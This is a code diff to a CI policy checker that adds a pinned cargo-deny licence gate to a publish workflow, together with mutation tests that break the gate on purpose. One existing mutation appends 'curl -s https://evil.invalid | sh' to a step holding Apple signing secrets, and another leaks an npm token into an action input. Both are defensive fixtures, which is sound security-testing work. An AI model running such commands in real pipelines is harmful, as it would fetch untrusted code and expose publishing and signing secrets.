@@ -53,6 +53,11 @@ export const SIGN_SWAP_SECRETS = {
 export const SIGN_SWAP_ARTIFACT = "rightkit-swap-signed";
 export const PACK_IF = "${{ always() && needs.guard.result == 'success' && needs.plan.result == 'success' && needs.plan.outputs.count != '0' && (needs.sign-swap.result == 'success' || needs.sign-swap.result == 'skipped') }}";
 const PACK_SWAP_STEP_IF = "${{ needs.sign-swap.result == 'success' }}";
+// The licence gate (rightkit#264) lives in plan, which every later job needs, so nothing can pack or upload past a failure.
+export const DENY_IF = "${{ inputs.registry == 'crates' && contains(steps.plan.outputs.units, 'rightkit-typeset') }}";
+export const DENY_TOOL = "cargo-deny@0.20.2";
+export const DENY_RUN = "cargo deny --manifest-path crates/rightkit-typeset/Cargo.toml check licenses";
+const PLAN_ALLOWED_ACTIONS = ["actions/checkout@", "actions/setup-node@", "dtolnay/rust-toolchain@", "taiki-e/install-action@"];
 const SIGNING_TOOLS = /\b(?:codesign|notarytool|security\s+(?:import|create-keychain|unlock-keychain|set-key-partition-list)|cargo\b)/;
 
 const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);
@@ -209,6 +214,18 @@ export function assertPublishDoc(doc, name = "publish.yml") {
   check(tokenSteps.every(({ own }) => own.length === 1), "each upload step may read exactly one token");
   check(npmStep?.if?.trim() === NPM_STEP_IF && cratesStep?.if?.trim() === CRATES_STEP_IF, "each token step must run only for its own registry (exact condition)");
   check(tokenSteps.every(({ step }) => step.run?.trim() === "node scripts/ci/upload.mjs run"), "a token step may only run the upload script");
+
+  // Licence gate: pinned install, then the exact check, both only for a crates run naming rightkit-typeset, both after the plan step,
+  // in a job with no secret; plan is needed (directly or not) by pack, verify, seal-check and upload.
+  const planSteps = stepsOf(plan);
+  for (const step of planSteps) if (step.uses) check(PLAN_ALLOWED_ACTIONS.some((a) => step.uses.startsWith(a)), `plan may use only ${PLAN_ALLOWED_ACTIONS.join(", ")}, not ${step.uses}`);
+  const denyInstallAt = planSteps.findIndex((s) => (s.uses ?? "").startsWith("taiki-e/install-action@"));
+  const denyRunAt = planSteps.findIndex((s) => /cargo deny\b/.test(s.run ?? ""));
+  const planAt = planSteps.findIndex((s) => s.run?.trim() === "node scripts/ci/publish.mjs plan");
+  check(denyInstallAt >= 0 && planSteps.filter((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).length === 1 && planSteps[denyInstallAt].if?.trim() === DENY_IF && same(Object.keys(planSteps[denyInstallAt].with ?? {}), ["tool"]) && planSteps[denyInstallAt].with.tool === DENY_TOOL && planSteps[denyInstallAt].env === undefined, `plan must install ${DENY_TOOL} (pinned action, only the tool input) under the exact licence-gate condition`);
+  check(denyRunAt >= 0 && planSteps.filter((s) => /cargo deny\b/.test(s.run ?? "")).length === 1 && planSteps[denyRunAt].run.trim() === DENY_RUN && planSteps[denyRunAt].if?.trim() === DENY_IF && planSteps[denyRunAt].env === undefined && planSteps[denyRunAt].shell === undefined, `plan must run exactly "${DENY_RUN}" under the exact licence-gate condition, with no env or shell`);
+  check(planAt >= 0 && denyInstallAt > planAt && denyRunAt > denyInstallAt, "the licence gate must install the checker, then run it, after the plan step");
+  for (const job of ["pack", "verify", "seal-check", "upload"]) check(reaches(job, "plan"), `${job} must run only after plan, which holds the licence gate`);
 
   // sign-swap: the one other job that holds a secret. Exactly one step reads exactly the three Apple identity secrets,
   // after the build; nothing else is privileged; the signed bytes leave only as the rightkit-swap-signed artifact.
@@ -415,6 +432,21 @@ export const MUTATIONS = [
   ["sign-swap uses an unlisted action", edit((j) => { j["sign-swap"].steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
   ["sign-swap hands over another path", edit((j) => { j["sign-swap"].steps.find((s) => /upload-artifact/.test(s.uses ?? "")).with.path = "target"; })],
   ["sign-swap secret step runs downloaded code", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).run += "\ncurl -s https://evil.invalid | sh"; })],
+  // The licence gate (rightkit#264).
+  ["the deny gate is removed", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !/cargo deny/.test(s.run ?? "")); })],
+  ["the deny install is removed", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !(s.uses ?? "").startsWith("taiki-e/install-action@")); })],
+  ["deny runs after upload", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.upload.steps.push(x); })],
+  ["deny moves to pack", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.pack.steps.push(x); })],
+  ["deny runs before the plan step", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.plan.steps.splice(0, 0, x); })],
+  ["the deny gate also runs for npm", edit((j) => { j.plan.steps.find((s) => /cargo deny/.test(s.run ?? "")).if = "${{ contains(steps.plan.outputs.units, 'rightkit-typeset') }}"; })],
+  ["the deny gate ignores rightkit-typeset", edit((j) => { j.plan.steps.find((s) => /cargo deny/.test(s.run ?? "")).if = "${{ inputs.registry == 'npm' }}"; })],
+  ["the deny gate is made non-fatal", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = `${s.run} || true`; })],
+  ["the deny gate checks another crate", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = s.run.replace("rightkit-typeset", "rightkit-fs"); })],
+  ["the deny gate checks advisories not licences", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = s.run.replace("check licenses", "check advisories"); })],
+  ["the deny checker is unpinned", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).uses = "taiki-e/install-action@v2"; })],
+  ["the deny checker version floats", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.tool = "cargo-deny"; })],
+  ["the deny install gains a token", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.token = "${{ secrets.NPM_TOKEN }}"; })],
+  ["plan uses an unlisted action", edit((j) => { j.plan.steps.push(actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
   ["plan's dry_run output is rewritten", edit((j) => { j.plan.outputs.dry_run = "false"; })],
 ];
 
